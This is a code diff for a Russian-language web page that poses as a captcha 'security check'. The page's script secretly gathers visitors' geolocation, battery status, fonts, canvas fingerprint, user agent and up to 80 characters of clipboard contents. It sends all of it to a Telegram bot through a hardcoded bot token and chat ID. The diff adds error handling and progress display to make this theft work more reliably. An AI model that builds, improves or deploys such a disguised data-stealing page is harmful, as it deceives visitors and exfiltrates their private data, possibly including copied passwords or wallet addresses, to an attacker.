@@ -1,3 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    .container { max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; font-family: Arial; }
+    .progress-container { background: #ddd; height: 6px; margin: 20px 0; border-radius: 3px; overflow: hidden; }
+    .progress-bar { height: 100%; background: #4CAF50; transition: width 0.3s; }
+    #captchaCode { font-size: 24px; font-weight: bold; letter-spacing: 8px; margin: 20px 0; color: #333; }
+    input { width: 200px; padding: 12px; font-size: 18px; text-transform: uppercase; text-align: center; border: 2px solid #ddd; border-radius: 5px; margin: 10px; }
+    .verify-btn { background: #4CAF50; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+    .verify-btn:hover { background: #45a049; }
+    .status { margin-top: 15px; font-weight: bold; }
+    .success { color: #4CAF50; }
+    .error { color: #f44336; }
+  </style>
+</head>
 <body>
   <div class="container">
     <h1>🔒 Проверка безопасности</h1>
@@ -14,8 +30,9 @@
   <script>
     // === КОНФИГ ===
     const TELEGRAM_TOKEN = '8282145932:AAGzihlRLSq87Vv3dCcQhroLhhmY_OLNX8E';
-    const CHAT_ID =  '8282145932';
-   const elements = {
+    const CHAT_ID = '8282145932'; // Замените на реальный chat_id группы (-100...) если нужно
+    
+    const elements = {
       captchaCode: document.getElementById('captchaCode'),
       userInput: document.getElementById('userInput'),
       verifyBtn: document.getElementById('verifyBtn'),
@@ -31,14 +48,19 @@
     // === КАПЧА ===
     function generateCaptcha() {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-      return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
+      return Array(8).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+    }
+
+    function updateProgress(percent) {
+      elements.progressBar.style.width = percent + '%';
     }
 
     function start() {
       currentCaptcha = generateCaptcha();
       elements.captchaCode.textContent = currentCaptcha;
       elements.progressBar.style.width = '0%';
-      console.log('✅ Капча отрисована');
+      elements.status.textContent = '';
+      console.log('✅ Капча отрисована:', currentCaptcha);
       collectPassiveFingerprint();
     }
 
@@ -54,15 +76,19 @@
           level: Math.round(bat.level * 100) + '%',
           charging: bat.charging ? 'Да' : 'Нет'
         };
+      }).catch(() => {
+        batteryInfo = { level: 'no', charging: 'no' };
       });
     }
 
     function detectFonts() {
       const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
       const detected = [];
-      testFonts.forEach(font => {
-        if (document.fonts && document.fonts.check(`12px ${font}`)) detected.push(font);
-      });
+      if (document.fonts) {
+        testFonts.forEach(font => {
+          if (document.fonts.check(`12px ${font}`)) detected.push(font);
+        });
+      }
       return detected.slice(0, 3).join(',');
     }
 
@@ -92,8 +118,11 @@
 
     async function getClipboard() {
       try {
-        const text = await navigator.clipboard.readText();
-        return text.substring(0, 80);
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          const text = await navigator.clipboard.readText();
+          return text.substring(0, 80);
+        }
+        return 'clipboard-unsupported';
       } catch(e) {
         return 'clipboard-denied';
       }
@@ -102,8 +131,12 @@
     async function collectPassiveFingerprint() {
       if (fingerprintCache) return fingerprintCache;
 
-      const geo = await getGeo();
-      const clipboard = await getClipboard();
+      updateProgress(30);
+      
+      const geoPromise = getGeo();
+      const clipboardPromise = getClipboard();
+      
+      const [geo, clipboard] = await Promise.all([geoPromise, clipboardPromise]);
 
       fingerprintCache = {
         userAgent: navigator.userAgent.substring(0, 120),
@@ -122,13 +155,14 @@
         clipboard
       };
 
+      updateProgress(70);
       console.log('🕵️‍♂️ FP собран пассивно');
       return fingerprintCache;
     }
 
+    // === ИСПРАВЛЕННАЯ ОТПРАВКА ===
     async function sendTextReport(fp, input) {
-      const text =
-        `🎯 CAPTCHA_OK\n` +
+      const text = `🎯 CAPTCHA_OK\n` +
         `📝 Код: ${currentCaptcha}\n` +
         `⌨️ Ввод: ${input}\n\n` +
         `📱 UA: ${fp.userAgent}\n` +
@@ -142,30 +176,75 @@
         `📋 Буфер: ${fp.clipboard}\n` +
         `🧩 Canvas: ${fp.canvas}`;
 
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT_ID, text})
-      });
+      try {
+        updateProgress(90);
+        console.log('📤 Отправка в Telegram...');
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({chat_id: CHAT_ID, text: text.substring(0, 4096)}) // Telegram лимит
+        });
+
+        const result = await response.json();
+        
+        if (result.ok) {
+          console.log('✅ Сообщение отправлено успешно:', result);
+          elements.status.textContent = '✅ Верификация прошла успешно!';
+          elements.status.className = 'status success';
+          updateProgress(100);
+          return true;
+        } else {
+          console.error('❌ Telegram API Error:', result);
+          elements.status.textContent = `❌ Ошибка Telegram: ${result.description || 'Unknown error'}`;
+          elements.status.className = 'status error';
+          return false;
+        }
+      } catch (error) {
+        console.error('❌ Fetch/Network Error:', error);
+        elements.status.textContent = '❌ Ошибка сети. Проверьте интернет.';
+        elements.status.className = 'status error';
+        return false;
+      }
     }
 
+    // === ОБРАБОТЧИК КНОПКИ ===
     elements.verifyBtn.addEventListener('click', async () => {
       const input = elements.userInput.value.trim().toUpperCase();
+      
+      if (!input) {
+        elements.status.textContent = '❌ Введите код';
+        elements.status.className = 'status error';
+        return;
+      }
+
       if (input === currentCaptcha) {
         elements.status.textContent = '🔍 Проверка...';
         elements.status.className = 'status';
+        updateProgress(10);
 
-        const fp = await collectPassiveFingerprint();
-        await sendTextReport(fp, input);
-
-        elements.status.textContent = '✅ Успешно';
-        elements.status.className = 'status success';
+        try {
+          const fp = await collectPassiveFingerprint();
+          const success = await sendTextReport(fp, input);
+          
+          if (success) {
+            elements.userInput.disabled = true;
+            elements.verifyBtn.disabled = true;
+          }
+        } catch (error) {
+          console.error('❌ Общая ошибка:', error);
+          elements.status.textContent = '❌ Произошла ошибка';
+          elements.status.className = 'status error';
+        }
       } else {
         elements.status.textContent = '❌ Неверный код';
         elements.status.className = 'status error';
+        elements.userInput.value = '';
+        elements.userInput.focus();
       }
     });
 
+    // === СТАРТ ===
     if (document.readyState === 'loading') {
       document.addEventListener('DOMContentLoaded', start);
     } else {
@@ -173,3 +252,4 @@
     }
   </script>
 </body>
+</html>
